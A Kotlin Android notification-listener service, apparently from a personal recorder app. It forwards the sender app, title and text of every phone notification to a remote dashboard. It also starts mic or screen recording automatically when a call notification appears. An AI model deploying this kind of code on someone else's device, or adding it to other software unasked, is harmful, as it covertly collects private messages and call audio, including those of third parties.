package com.example.personalrecorder.services

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import com.example.personalrecorder.net.RealtimeClient
import org.json.JSONObject

/**
 * Forwards every notification posted on the phone to the dashboard
 * (Notifications tab) and auto-triggers call recording when a call
 * notification appears.
 *
 * Requires the user to grant notification access (Settings -> Special
 * access -> Notification access). The system starts this service whenever
 * the permission is granted; no manual start is needed.
 */
class NotificationListenerService : NotificationListenerService() {

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val pkg = sbn.packageName ?: return
        // Never log our own notifications (steady-link, recording, ...).
        if (pkg == packageName) return
        val extras = sbn.notification?.extras
        val title = extras?.getCharSequence(Notification.EXTRA_TITLE)?.toString().orEmpty()
        val text = extras?.getCharSequence(Notification.EXTRA_TEXT)?.toString().orEmpty()
        val category = sbn.notification?.category
        val payload = JSONObject()
            .put("pkg", pkg)
            .put("title", title)
            .put("text", text)
            .put("when", sbn.postTime)
            .put("key", sbn.key)
            .put("category", category ?: JSONObject.NULL)
        RealtimeClient.send("notification", payload)

        // Auto call trigger: a call notification means a call is in progress.
        // Video calls are recorded via the screen+mic session (needs the
        // one-time projection consent); otherwise the mic-only recorder
        // captures the user's side of the call.
        val isCall = category == Notification.CATEGORY_CALL ||
            title.contains("incoming call", ignoreCase = true) ||
            text.contains("incoming call", ignoreCase = true)
        if (isCall) {
            RealtimeClient.send(
                "call_detected",
                JSONObject().put("pkg", pkg).put("kind", "call")
            )
            if (ScreenAudioRecorderService.hasActiveProjectionInstance()) {
                ScreenAudioRecorderService.onRemoteCallVideoStart(applicationContext)
            } else {
                AudioRecorderService.onRemoteCallAudioStart(applicationContext)
            }
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification) {
        // Intentionally not forwarded: the dashboard log is about what was
        // posted, not what was dismissed.
    }
}
